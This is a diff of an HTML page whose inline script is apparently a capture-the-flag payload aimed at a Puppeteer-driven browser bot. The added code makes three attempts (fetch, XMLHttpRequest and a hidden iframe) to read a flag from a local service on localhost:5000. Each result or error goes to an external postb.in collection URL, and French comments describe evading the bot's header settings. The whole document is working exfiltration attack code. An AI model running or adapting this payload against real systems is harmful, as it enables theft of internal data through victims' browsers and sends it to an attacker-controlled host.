@@ -7,14 +7,32 @@
 <script>
   const EXFIL = "https://www.postb.in/1778660481006-3008019395638";
 
-  fetch("http://127.0.0.1:5000/flag")
+  // Tentative 1 : fetch direct (contourne extraHTTPHeaders Puppeteer)
+  fetch("http://localhost:5000/flag", { credentials: "omit" })
     .then(r => r.text())
-    .then(data => {
-      return fetch(EXFIL + "?flag=" + encodeURIComponent(data));
-    })
-    .catch(e => {
-      fetch(EXFIL + "?err=" + encodeURIComponent(e.toString()));
-    });
+    .then(data => fetch(EXFIL + "?method=fetch&flag=" + encodeURIComponent(data)))
+    .catch(e => fetch(EXFIL + "?method=fetch&err=" + encodeURIComponent(e.toString())));
+
+  // Tentative 2 : via XMLHttpRequest
+  const xhr = new XMLHttpRequest();
+  xhr.open("GET", "http://localhost:5000/flag", true);
+  xhr.onload = () => fetch(EXFIL + "?method=xhr&flag=" + encodeURIComponent(xhr.responseText));
+  xhr.onerror = (e) => fetch(EXFIL + "?method=xhr&err=" + encodeURIComponent(String(e)));
+  xhr.send();
+
+  // Tentative 3 : iframe (pas de CORS, juste Same-Origin)
+  const iframe = document.createElement("iframe");
+  iframe.src = "http://localhost:5000/flag";
+  iframe.style.display = "none";
+  iframe.onload = function() {
+    try {
+      const content = iframe.contentDocument.body.innerHTML;
+      fetch(EXFIL + "?method=iframe&flag=" + encodeURIComponent(content));
+    } catch(e) {
+      fetch(EXFIL + "?method=iframe&err=" + encodeURIComponent(e.toString()));
+    }
+  };
+  document.body.appendChild(iframe);
 </script>
 </body>
 </html>
